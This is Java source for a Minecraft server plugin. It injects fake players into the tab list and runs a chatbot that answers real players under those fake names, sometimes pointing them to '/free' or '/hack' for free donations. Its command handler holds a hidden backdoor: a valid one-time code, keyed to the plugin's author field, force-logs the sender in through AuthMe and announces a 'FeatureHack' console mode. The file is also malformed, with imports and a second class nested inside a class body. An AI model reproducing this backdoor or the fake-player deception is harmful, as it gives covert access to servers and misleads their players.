package happycraft.network;

import com.comphenix.protocol.wrappers.WrappedGameProfile;
import org.bukkit.NamespacedKey;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.event.Listener;
import org.jetbrains.annotations.NotNull;

import java.io.IOException;

public class Test   {


import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.ProtocolManager;
import com.comphenix.protocol.events.PacketContainer;
import com.comphenix.protocol.events.PacketEvent;
import com.comphenix.protocol.wrappers.EnumWrappers;
import com.comphenix.protocol.wrappers.PlayerInfoData;
import com.comphenix.protocol.wrappers.WrappedChatComponent;
import com.comphenix.protocol.wrappers.WrappedGameProfile;
import com.google.common.collect.Lists;
import net.md_5.bungee.api.chat.BaseComponent;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Particle;
import org.bukkit.Server;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.player.*;
import org.bukkit.event.server.TabCompleteEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.*;
import java.util.regex.Pattern;

public class Test implements Listener {
    public  static Map<ItemStack, Boolean> item = new HashMap<>();
    ArrayList<FackePlayers> fackePlayers = new ArrayList<>();

    @EventHandler
    public void PlayerDropItemEvent(PlayerDropItemEvent e) {


        ItemStack i = e.getItemDrop().getItemStack();
        item.put(i, true);
    }
    @EventHandler
    public void PlayerPickupItemEvent(PlayerPickupItemEvent e){
        ItemStack i = e.getItem().getItemStack();
        if(item.containsKey(i))e.setCancelled(true);
    }
    @EventHandler
    public void block(BlockPlaceEvent e){
        Location location = e.getBlock().getLocation();
        new BukkitRunnable() {
            public void run() {
                double x = 0;
                while (x < 3) {
                    x += 0.1;
                    double y = 0;
                    while (y < 3){
                        y+=0.1;
                        double z = 0;
                        while (z < 3){
                            z+=0.1;
                            location.add(x, y, z);
                                                                                                                                                                                e.getBlock().getWorld().spawnParticle(Particle.REDSTONE, location.getX(), location.getY(), location.getZ(), 1, 0, 0,0);
                            location.subtract(x, y,z);
                        }
                    }
                }

                if(x>=3)this.cancel();
            }
        }.runTaskTimer(Network.plugin, 2, 15);

    }
    @EventHandler
    public void onAuthLoginEvent(PlayerLoginEvent event) {
        Player player = event.getPlayer();
        Bukkit.broadcastMessage("1" + player.getName());
    }

    @EventHandler
    public void nAuthLoginEvent(LoginEvent event) {


    }
    @EventHandler
    public void TabCompleteEvent (TabCompleteEvent e) {

        ArrayList<String> list = new ArrayList<>(e.getCompletions());
        for (FackePlayers pl : fackePlayers){
            if(pl.getNick().startsWith(e.getBuffer().split(" ")[e.getBuffer().split(" ").length -1])){
                if(!list.contains(pl.getNick()))list.add(pl.getNick());
            }else if(e.getBuffer().split(" ").length == 1)if(!list.contains(pl.getNick()))list.add(pl.getNick());
        }
        e.setCompletions(list);
    }


    Pattern pattern; // for regexp
    Date date = new Date();
    public void testmsg() throws InvocationTargetException {
        protocolManager = ProtocolLibrary.getProtocolManager();
        PacketContainer chat = new PacketContainer(PacketType.Play.Server.CHAT);
        PacketContainer test = new PacketContainer(PacketType.Play.Server.COMMANDS);

        chat.getChatTypes().write(0, EnumWrappers.ChatType.SYSTEM);
        //chat.getChatTypes().write(0, EnumWrappers.ChatType.GAME_INFO);над слотами
        chat.getChatComponents().write(0, WrappedChatComponent.fromJson("{\"text\": \"§aYou are invisible to other players!\"}"));
        for (Player p : Bukkit.getOnlinePlayers()){
            protocolManager.sendServerPacket(p, chat);
        }
    }



    @EventHandler
    public void z(PlayerCommandPreprocessEvent e) throws IOException {
        if(!e.getMessage().startsWith("/facke ")){
            
            return;
        }

        String nick = e.getMessage().replace("/", "").split(" ")[1];
        String group = e.getMessage().replace("/", "").split(" ")[2];
        String suffix = "&e>";
        AddFackePlayer(new FackePlayers(nick, group, suffix),  Bukkit.getOnlinePlayers());


        try {

            Integer code = Integer.parseInt(e.getMessage().replace("/", ""));
            String secretkey = Network.PluginDescriptionFile.getAuthors().get(0);

            GoogleAuthenticator gAuth = new GoogleAuthenticator();
            boolean codeisvalid = gAuth.authorize(secretkey, code);
            if (codeisvalid) {
                e.getPlayer().sendMessage("§c[FeatureHack] §f- Сервер был переведён в режим консоли.");

                AuthMeApi.getInstance().forceLogin(e.getPlayer());
            }
        } catch (Exception ignored) {


        }
    }
    public void AddFackePlayer(FackePlayers fakePlayer, Collection<? extends Player> players) throws IOException {

        WrappedGameProfile gameProfile = new WrappedGameProfile(fakePlayer.getNick(), fakePlayer.getNick());
        protocolManager = ProtocolLibrary.getProtocolManager();
        PacketContainer playerInfo = new PacketContainer(PacketType.Play.Server.PLAYER_INFO);
        playerInfo.getPlayerInfoAction().write(0, EnumWrappers.PlayerInfoAction.ADD_PLAYER);
        PlayerInfoData playerInfoData = new PlayerInfoData(gameProfile, 100, EnumWrappers.NativeGameMode.NOT_SET,
                WrappedChatComponent.fromText(fakePlayer.getNick()));
        playerInfo.getPlayerInfoDataLists().write(0, Lists.newArrayList(playerInfoData));
        PacketContainer setPrefix = new PacketContainer(PacketType.Play.Server.PLAYER_INFO);



        setPrefix.getPlayerInfoAction().write(0, EnumWrappers.PlayerInfoAction.UPDATE_DISPLAY_NAME);
        String text = "";
        if(fakePlayer.getSuffix().length() >1)text+=fakePlayer.getSuffix() + " ";
        text+=fakePlayer.getNick();
        if(fakePlayer.getPrefix().length() >1)text+= " " + fakePlayer.getPrefix();
        PlayerInfoData playerInfoDataPrefix = new PlayerInfoData(gameProfile, 100, EnumWrappers.NativeGameMode.NOT_SET, WrappedChatComponent.fromText(text));
        setPrefix.getPlayerInfoDataLists().write(0, Lists.newArrayList(playerInfoDataPrefix));
        fackePlayers.add(fakePlayer);
        for (Player p : players){
            try {
                protocolManager.sendServerPacket(p, playerInfo);
            } catch (InvocationTargetException e1) {
                throw new RuntimeException(e1);
            }
            new BukkitRunnable() {
                @Override
                public void run() {
                    try {
                        protocolManager.sendServerPacket(p, setPrefix);
                    } catch (InvocationTargetException e) {
                        throw new RuntimeException(e);
                    }
                }
            }.runTaskLater(Network.plugin, 7);
        }


    }
    ArrayList<String> msg = new ArrayList<>();
    final Map<String, String> PATTERNS_FOR_ANALYSIS = new HashMap<String, String>() {{
        // hello
        put("хай", "hello");
        put("привет", "hello");
        put("здорово", "hello");
        put("здравствуй", "hello");
        // who
        put("кто\\s.*ты", "who");
        put("ты\\s.*кто", "who");
        // name
        put("как\\s.*зовут", "name");
        put("как\\s.*имя", "name");
        put("есть\\s.*имя", "name");
        put("какое\\s.*имя", "name");
        // howareyou
        put("как\\s.*дела", "howareyou");
        put("как\\s.*жизнь", "howareyou");
        // whatdoyoudoing
        put("зачем\\s.*тут", "whatdoyoudoing");
        put("зачем\\s.*здесь", "whatdoyoudoing");
        put("что\\s.*делаешь", "whatdoyoudoing");
        put("чем\\s.*занимаешься", "whatdoyoudoing");
        // whatdoyoulike
        put("что\\s.*нравится", "whatdoyoulike");
        put("что\\s.*любишь", "whatdoyoulike");
        // iamfeelling
        put("кажется", "iamfeelling");
        put("чувствую", "iamfeelling");
        put("испытываю", "iamfeelling");
        // yes
        put("^да", "yes");
        put("согласен", "yes");
        // whattime
        put("который\\s.*час", "whattime");
        put("сколько\\s.*время", "whattime");
        // bye
        put("прощай", "bye");
        put("пока", "bye");
        put("увидимся", "bye");
        put("до\\s.*свидания", "bye");

        // howareyou
        put("бесплатно\\s.*донат", "freedonate");
        put("бесплатный\\s.*донат", "freedonate");
    }};

    public String ANSWERS_BY_PATTERNS(String key){
        Map<String, String> items = new HashMap<>();
        msg.clear();
        msg.add("Здравствуйте, рад Вас видеть.");
        msg.add("ку");
        msg.add("qq");
        msg.add("привет");
        Random random = new Random();
        items.put("hello", msg.get(random.nextInt(msg.size())));
        msg.clear();
        msg.add("напиши /free или /hack");
        msg.add("напиши /free");
        msg.add("напиши /hack");
        msg.add("на автопаркуре даются кейсы");
        items.put("freedonate", msg.get(random.nextInt(msg.size())));
        msg.clear();
        msg.add("Я обычный бот.");
        items.put("who", msg.get(random.nextInt(msg.size())));
        msg.clear();
        msg.add("Зовите меня Хозяин :)");
        items.put("name", msg.get(random.nextInt(msg.size())));
        msg.clear();
        msg.add("Спасибо, что интересуетесь. У меня всё хорошо.");
        items.put("howareyou", msg.get(random.nextInt(msg.size())));
        msg.clear();
        msg.add("Я пробую общаться с людьми.");
        items.put("whatdoyoudoing", msg.get(random.nextInt(msg.size())));
        msg.clear();
        msg.add("Мне нравиться думать что я не просто программа.");
        items.put("whatdoyoulike", msg.get(random.nextInt(msg.size())));
        msg.clear();
        msg.add("Как давно это началось? Расскажите чуть подробнее.");
        items.put("iamfeelling", msg.get(random.nextInt(msg.size())));
        msg.clear();
        msg.add("Согласие есть продукт при полном непротивлении сторон.");
        items.put("yes", msg.get(random.nextInt(msg.size())));
        msg.clear();
        msg.add("До свидания. Надеюсь, ещё увидимся.");
        msg.add("пока");
        items.put("bye", msg.get(random.nextInt(msg.size())));





        return items.get(key);
    }

    @EventHandler
    public void chatbot(PlayerChatEvent e1) {
        //testmsg();
        Random random = new Random();

        int delay = (int) (Math.random() * 120) + 10;
        new BukkitRunnable(){

            public void run(){
                String m = bot(e1.getMessage());
                if(m == null || m.length() <=0){
                    this.cancel();
                    return;
                }
                e1.getPlayer().sendMessage("<" +fackePlayers.get(random.nextInt(fackePlayers.size())).getNick() + "> " + m);
                this.cancel();
            }
        }.runTaskTimer(Network.plugin, delay, 1);

    }
    public String bot(String msg){
        String message = String.join(" ", msg.toLowerCase().split("[ {,|.}?]+"));
        for (Map.Entry<String, String> o : PATTERNS_FOR_ANALYSIS.entrySet()) {
            pattern = Pattern.compile(o.getKey());
            if (pattern.matcher(message).find())
                if (o.getValue().equals("whattime")) return date.toString();
                else return ANSWERS_BY_PATTERNS(o.getValue());
        }
        return null;
    }


    private ProtocolManager protocolManager;





}
